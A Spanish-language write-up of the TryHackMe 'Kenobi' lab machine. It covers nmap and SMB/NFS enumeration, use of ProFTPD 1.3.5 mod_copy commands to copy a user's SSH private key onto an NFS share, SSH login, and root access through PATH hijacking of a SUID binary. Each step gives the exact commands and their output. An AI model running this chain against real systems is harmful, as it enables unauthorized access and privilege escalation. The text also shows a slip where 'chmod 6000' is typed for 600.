---
title: Kenobi Writeup - TryHackMe
date: 2023-04-02
categories: [Writeups, THM]
tags: [Linux, THM, CTF, Easy, Mod Copy, PATH Hijacking]
image: /assets/img/commons/kenobi/kenobi.avif
---


¡Hola!

En este writeup, exploraremos la sala [**Kenobi**](https://tryhackme.com/room/kenobi) de TryHackMe, de dificultad fácil según la plataforma. A través de esta sala, abordaremos la explotación de una máquina Linux, realizaremos la enumeración del servicio Samba para los recursos compartidos, manipularemos una versión vulnerable de ProFTPd y llevaremos a cabo la escalada de privilegios mediante la manipulación de la variable PATH.

¡Empecemos!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.159.70
PING 10.10.159.70 (10.10.159.70) 56(84) bytes of data.
64 bytes from 10.10.159.70: icmp_seq=1 ttl=61 time=293 ms

--- 10.10.159.70 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 293.459/293.459/293.459/0.000 ms
```

Dado que el `TTL` es cercano a 64, podemos inferir que la máquina objetivo probablemente sea Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.159.70 -oG allPorts.txt
```

Donde:

- `-p-`: indica que se escaneen todos los puertos posibles (65535) del objetivo.
- `--open`: indica que se muestren solo los puertos abiertos, ignorando los cerrados o filtrados.
- `-n`: indica que no se haga resolución DNS.
- `-sS`: indica que se use el tipo de escaneo TCP SYN.
- `-Pn`: indica que se debe omitir el descubrimiento de hosts y asumir que todos los objetivos están vivos.
- `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
- `10.10.159.70`: indica la dirección IP del objetivo a escanear.
- `-oG allPorts`: indica que se guarde el resultado del escaneo en formato grepeable en el archivo allPorts.

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 15:50 -05
Nmap scan report for 10.10.159.70
Host is up (0.30s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
33913/tcp open  unknown
44957/tcp open  unknown
48581/tcp open  unknown
57083/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.98 seconds
```

Vemos que hay varios puertos habilitados, entre ellos el `21 (FTP)`, `22 (SSH)`, `80 (HTTP)`, `111 (RPC)`, `139` y `445 (SMB)` y otros de carácter desconocido de momento.

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados, con el propósito de obtener más información sobre la configuración y posibles vulnerabilidades del sistema objetivo.

```bash
❯ nmap -p 21,22,80,111,139,445,2049,33913,44957,48581,57083 -sV -sC --min-rate 5000 -oN services.txt 10.10.159.70
```

Donde:

- `-p 21,22,80,111,139,445,2049,33913,44957,48581,57083`: indica que se escaneen solo los puertos especificados del objetivo.
- `-sV`: indica que se sondeen los puertos abiertos para determinar la información de servicio y versión.
- `-sC`: indica que se ejecute el script por defecto de Nmap, que realiza varias pruebas comunes como detección de vulnerabilidades o enumeración de recursos.
- `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
- `10.10.159.70`: indica la dirección IP del objetivo a escanear.
- `-oN services.txt`: indica que se guarde el resultado del escaneo en formato normal en el archivo services.txt.

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 15:57 -05
Nmap scan report for 10.10.159.70
Host is up (0.29s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3ad834149e95d168d3b0f057be2c0ae (RSA)
|   256 f8277d642997e6f865546522f7c81d8a (ECDSA)
|_  256 5a06edebb6567e4c01ddeabcbafa3379 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      35999/tcp6  mountd
|   100005  1,2,3      38500/udp   mountd
|   100005  1,2,3      39280/udp6  mountd
|   100005  1,2,3      44957/tcp   mountd
|   100021  1,3,4      33913/tcp   nlockmgr
|   100021  1,3,4      34403/udp6  nlockmgr
|   100021  1,3,4      35097/tcp6  nlockmgr
|   100021  1,3,4      53718/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
33913/tcp open  nlockmgr    1-4 (RPC #100021)
44957/tcp open  mountd      1-3 (RPC #100005)
48581/tcp open  mountd      1-3 (RPC #100005)
57083/tcp open  mountd      1-3 (RPC #100005)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-04-02T20:57:16
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2023-04-02T15:57:17-05:00
|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.91 seconds
```

En el informe se destacan varios aspectos relevantes, entre los cuales se encuentra la posibilidad de que el sistema operativo de la máquina objetivo sea `Ubuntu`, así como la versión de los servicios FTP (**`ProFTPD 1.3.5`**), SSH (`OpenSSH 7.2p2`) y HTTP (`Apache 2.4.18`).

Además, se destaca que en el archivo `robots.txt`, la entrada `admin.html` correspondiente al servidor web se encuentra deshabilitada. Por último, vemos que el servicio RPC otorga acceso a un sistema de archivos en red `NFS` (Network File System), lo que indica la presencia de una carpeta compartida en red.

### HTTP - 80

Tras identificar un servicio HTTP en el puerto 80, exploramos el contenido de la página web. Como vemos se trata de una página web de una imagen estática de la película "*Star Wars - Episodio III: La Venganza de los Sith*". Examinamos cada uno de los apartados de la página y su código fuente, pero no encontramos nada relevante.

![web](/assets/img/commons/kenobi/web.png){: .center-image }

Accedimos al directorio previamente oculto (`admin.html`) y encontramos una imagen GIF del personaje ficticio de Star Wars, Almirante Ackbar, pronunciando su famosa línea "*It's a trap*". Esta situación la interpretamos como una señal de que este camino no conducía a una explotación exitosa del sistema. Por lo tanto, decidimos continuar con la enumeración de los servicios previamente identificados.

![admin](/assets/img/commons/kenobi/admin.png){: .center-image }

### SMB - 445,139

A continuación, procedemos a realizar la enumeración del servicio SMB. En primer lugar, listamos los recursos compartidos con la herramienta `smbclient` sin proporcionar contraseñas.

```bash
❯ smbclient -L //10.10.159.70 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      
	IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            KENOBI
```

Entre los distintos recursos identificados, destaca particularmente aquel denominado como `anonymous`. Para acceder al mismo, utilizamos nuevamente la herramienta `smbclient`, empleando el siguiente comando:

```bash
❯ smbclient //10.10.159.70/anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 05:49:09 2019
  ..                                  D        0  Wed Sep  4 05:56:07 2019
  log.txt                             N    12237  Wed Sep  4 05:49:09 2019

		9204224 blocks of size 1024. 6877100 blocks available
smb: \>
```

Logramos acceder al recurso en el que se aloja un único archivo denominado `log.txt`. Para su posterior análisis, procedemos a descargar dicho archivo en la máquina local mediante el uso del comando `get`.

```bash
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (10,1 KiloBytes/sec) (average 10,1 KiloBytes/sec)
smb: \>
```

Una vez que se ha completado la descarga del archivo, examinamos su contenido detalladamente:

```bash
❯ cat log.txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: log.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Generating public/private rsa key pair.
   2   │ Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
   3   │ Created directory '/home/kenobi/.ssh'.
   4   │ Enter passphrase (empty for no passphrase): 
   5   │ Enter same passphrase again: 
   6   │ Your identification has been saved in /home/kenobi/.ssh/id_rsa.
   7   │ Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
   8   │ The key fingerprint is:
   9   │ SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
  10   │ The key's randomart image is:
  11   │ +---[RSA 2048]----+
  12   │ |                 |
  13   │ |           ..    |
  14   │ |        . o. .   |
  15   │ |       ..=o +.   |
  16   │ |      . So.o++o. |
  17   │ |  o ...+oo.Bo*o  |
  18   │ | o o ..o.o+.@oo  |
  19   │ |  . . . E .O+= . |
  20   │ |     . .   oBo.  |
  21   │ +----[SHA256]-----+
  22   │ 
  23   │ # This is a basic ProFTPD configuration file (rename it to 
  24   │ # 'proftpd.conf' for actual use.  It establishes a single server
  25   │ # and a single anonymous login.  It assumes that you have a user/group
  26   │ # "nobody" and "ftp" for normal operation and anon.
  27   │ 
  28   │ ServerName          "ProFTPD Default Installation"
  29   │ ServerType          standalone
  30   │ DefaultServer           on

[...]
```

El archivo descargado resulta ser extenso, conteniendo información relevante sobre diversas configuraciones de servicios previamente identificados durante el escaneo inicial del sistema. Es preciso destacar, en particular, la sección inicial en la que se detalla la creación de una clave pública y privada correspondiente al usuario `kenobi`, y su respectiva ubicación dentro del sistema.

Considerando la información recopilada, nuestro siguiente objetivo se centra en obtener la clave privada correspondiente al usuario `kenobi`, con el fin de establecer una conexión segura vía SSH y acceder al sistema en cuestión con dicho usuario.

### FTP - 21

A continuación, iniciamos el proceso de enumeración del servicio FTP. En primer lugar, verificamos si es posible acceder al servidor como usuario `anonymous`, sin necesidad de proporcionar una contraseña de acceso.

```bash
❯ ftp 10.10.159.70
Connected to 10.10.159.70.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.159.70]
Name (10.10.159.70:juanr): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
530 Login incorrect.
ftp: Login failed
ftp>
```

Como vemos, no ha sido posible acceder al servidor como usuario `anonymous`.

### NFS

Como mencionamos anteriormente, el servidor ejecuta un servicio `RPC` en el puerto `111` que permite el acceso a un sistema de archivos **NFS** presente en el sistema. Por lo tanto, procedemos con la enumeración detallada de los sistemas de archivos **NFS** compartidos mediante el uso de los siguientes scripts NSE de `Nmap`.

```bash
❯ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.159.70
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 17:24 -05
Nmap scan report for 10.10.159.70
Host is up (0.29s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836540.0  6877088.0  22%   16.0T        32000
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_

Nmap done: 1 IP address (1 host up) scanned in 4.31 seconds
```

El resultado de la enumeración detallada revela que la carpeta compartida a nivel de red es `/var`.

## Explotación

---

### Mod Copy

Durante la enumeración de la versión de los servicios, obtuvimos la versión del servicio FTP, la cual es `ProFTPD 1.3.5`. Al buscar posibles vulnerabilidades para esta versión, encontramos las siguientes:

```bash
❯ searchsploit ProFTPD 1.3.5
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                      |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                           | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                 | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                                             | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                                           | linux/remote/36742.txt
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Se muestra una lista de exploits que hacen referencia a la vulnerabilidad `mod_copy` para la versión del servicio FTP que identificamos durante la enumeración. Esta vulnerabilidad es una falla de seguridad que permite a un atacante remoto copiar archivos de cualquier directorio en el servidor que esté accesible a través del servicio FTP, sin necesidad de autenticación. Esto se realiza por medio de los comandos `CPFR` (para copiar) y `CPTO` (para pegar).

A continuación, se presenta la forma en que el exploit [ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)](https://www.exploit-db.com/exploits/49908) aprovecha esta vulnerabilidad para ejecutar código de forma remota en el servidor objetivo.

Considerando el contexto, es importante mencionar que nuestro objetivo actual es obtener la clave privada del usuario `kenobi` para lograr acceso al servidor. Por lo tanto, en lugar de explorar la vulnerabilidad `mod_copy` que permitiría la ejecución remota de código, nuestra estrategia será emplear los comandos `CPFR` y `CPTO` a través del servicio FTP para copiar la clave privada desde el servidor hacia nuestra máquina.

Para verificar si es posible ejecutar los comandos `CPFR` y `CPTO`, procedemos a obtener ayuda sobre los comandos específicos admitidos por el servidor FTP mediante el comando `site help`.

```bash
ftp> site help
214-The following SITE commands are recognized (* =>'s unimplemented)
 CPFR <sp> pathname
 CPTO <sp> pathname
 HELP
 CHGRP
 CHMOD
214 Direct comments to root@kenobi
ftp>
```

Podemos observar que los comandos `CPFR` y `CPTO` están permitidos en el servidor. Por lo tanto, procedemos a copiar la llave privada en el directorio del servicio web (/`var/www/html/`) para poder acceder a ella a través del navegador.

```bash
ftp> site cpfr /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
ftp> site cpto /var/www/html/id_rsa
550 cpto: Permission denied
ftp>
```

Aparentemente, no disponemos de permisos de lectura en el directorio mencionado, lo cual nos impide realizar la copia de la llave privada.

A continuación, intentamos copiar la llave privada a la carpeta `/var` que se comparte en red. De esta manera, podremos montar el NFS y acceder al archivo posteriormente.

```bash
ftp> site cpfr /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
ftp> site cpto /var/tmp/id_rsa
250 Copy successful
ftp>
```

Podemos verificar que la copia se realizó correctamente. Ahora, procedemos a montar el sistema de archivos NFS. Para hacerlo, creamos una carpeta en el directorio `/mnt` de nuestra máquina y montamos el NFS en ella. Finalmente, nos dirigimos a la carpeta montada para verificar su contenido:

```bash
❯ mkdir /mnt/kenobi
❯ mount 10.10.159.70:/var/tmp/ /mnt/kenobi/
❯ cd /mnt/kenobi
❯ ll
drwx------ root  root  4.0 KB Wed Sep  4 07:09:48 2019  systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
drwx------ root  root  4.0 KB Wed Sep  4 07:28:49 2019  systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
drwx------ root  root  4.0 KB Sun Apr  2 15:48:34 2023  systemd-private-d579f543b42f4d1c9b69865931545b16-systemd-timesyncd.service-rquHrQ
drwx------ root  root  4.0 KB Wed Sep  4 03:49:43 2019  systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
.rw-r--r-- juanr juanr 1.6 KB Sun Apr  2 17:50:43 2023  id_rsa
```

Una vez confirmado que la llave se encuentra en el directorio de montaje, procedemos a copiarla a un directorio local de nuestra máquina.

```bash
❯ cp /mnt/kenobi/id_rsa .
```

Para poder autenticarnos por SSH utilizando la llave privada, es necesario otorgarle los permisos adecuados mediante el comando `chmod 600`:

```bash
❯ chmod 6000 id_rsa
```

Finalmente, utilizamos la llave privada para conectarnos al servidor a través de SSH, especificando el usuario `kenobi`.

```bash
❯ ssh -i id_rsa kenobi@10.10.159.70
The authenticity of host '10.10.159.70 (10.10.159.70)' can't be established.
ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.159.70' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.

Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ id 
uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
kenobi@kenobi:~$
```

Una vez que hemos obtenido acceso al sistema, procedemos leer la flag de usuario en su directorio principal.

```bash
kenobi@kenobi:~$ cat user.txt 
d0b0f3f53b6caa53****************
```

## Escalación de privilegios

---

Después de obtener una shell en la máquina, nuestro objetivo es elevar nuestros privilegios y obtener acceso como usuario `root`. Una buena practica es listar los privilegios que tiene el usuario actual para ejecutar comandos con `sudo`. Lamentablemente, esta acción nos solicita la contraseña del usuario `kenobi`, la cual desconocemos. 

A continuación, listamos los binarios `SUID` con el fin de identificar posibles binarios con permisos mal configurados que puedan permitirnos escalar privilegios.

```bash
kenobi@kenobi:~$ find / -perm -4000 -type f -user root 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

Obtenemos un binario inusual en el sistema llamado `menu`. Este binario no es común y no se encuentra en la lista de binarios de **GTFObins**. En estos casos, es posible que se trate de un binario personalizado creado por un usuario del sistema. Para confirmar esto, lo ejecutamos de manera normal.

```bash
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Sun, 02 Apr 2023 23:19:52 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html
```

La utilidad `menu` parece ser un programa personalizado que realiza varias acciones y muestra información en la máquina. Sin embargo, es importante tener en cuenta que este programa ejecuta comandos en la máquina y si estos comandos no se encuentran declarados con una ruta absoluta, podría ser peligroso.

### PATH hijacking

Recordemos que un binario puede ser llamado de forma relativa, como por ejemplo `curl`, o de manera absoluta, como `/usr/bin/curl`. Si se llama de manera relativa, existe un riesgo de seguridad conocido como `PATH Hijacking` en el sistema, el cual puede ser explotado por un atacante para ejecutar código malicioso. Por lo tanto, es recomendable siempre utilizar la ruta absoluta al llamar un binario.

En esencia, el `PATH Hijacking` ocurre cuando un atacante coloca un archivo malicioso con el mismo nombre que un archivo legítimo en una de las rutas de búsqueda especificadas en la variable de entorno **PATH** del sistema operativo.

Cuando un usuario ejecuta un comando desde la línea de comandos, el sistema operativo buscará el archivo correspondiente en cada una de las rutas de búsqueda especificadas en la variable de entorno `PATH`. Si un archivo malicioso se encuentra en una de estas rutas antes que el archivo legítimo, existe un riesgo de seguridad ya que el sistema operativo ejecutará el archivo malicioso en lugar del archivo esperado. De esta manera, el atacante podría ejecutar código malicioso en la computadora de la víctima.

En este contexto, un atacante puede forzar al sistema a buscar el binario `curl` en un directorio de su elección, donde previamente ha colocado su propia versión de `curl` que ejecuta una acción maliciosa.

Si extraemos las cadenas de texto legibles del archivo binario, podemos identificar los comandos que se están ejecutando en el sistema.

```bash
[...]

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice

[...]
```

Observamos que los binarios se están ejecutando de forma relativa, lo que nos permite aplicar un ataque de `PATH hijacking`. Para llevar a cabo este ataque, primero creamos un binario malicioso de `curl` que abra una shell y le otorgamos permisos de ejecución.

```bash
kenobi@kenobi:/tmp$ echo "/bin/bash" > curl
kenobi@kenobi:/tmp$ chmod +x curl
```

Posteriormente, modificamos la variable de entorno `PATH`, que contiene las ubicaciones de los binarios en Linux y se busca de manera descendente para ejecutarlos. En este caso, debemos colocar nuestro directorio actual de trabajo (`/tmp`) como el primero en el `PATH` para asegurarnos de que el sistema encuentre nuestro binario malicioso antes que el legítimo. Para lograr esto, ejecutamos el siguiente comando:

```bash
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
```

Podemos observar que el directorio `/tmp` se encuentra ahora en la posición inicial del PATH, gracias al comando ejecutado anteriormente.

```bash
kenobi@kenobi:/tmp$ echo $PATH
/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

En este escenario es fundamental tener en cuenta que el binario `menu` se ejecuta con los privilegios de superusuario (`root`). Si el usuario selecciona la opción 1 del menú, que implica la ejecución del comando `curl`, el binario `curl` se ejecutará como usuario root. Dado que previamente hemos creado una versión maliciosa del binario `curl` y hemos modificado la variable `PATH` para que el sistema busque primero en el directorio `/tmp`, se ejecutará nuestra versión maliciosa de `curl` en lugar de la original, lo que resultará en la apertura de una shell con permisos de usuario root.

```bash
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:/tmp# id       
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

Finalmente, accedemos al directorio `/root` y leemos la última flag.

```bash
root@kenobi:/root# cat root.txt 
177b3cd8562289f3****************
```

¡Happy Hacking!
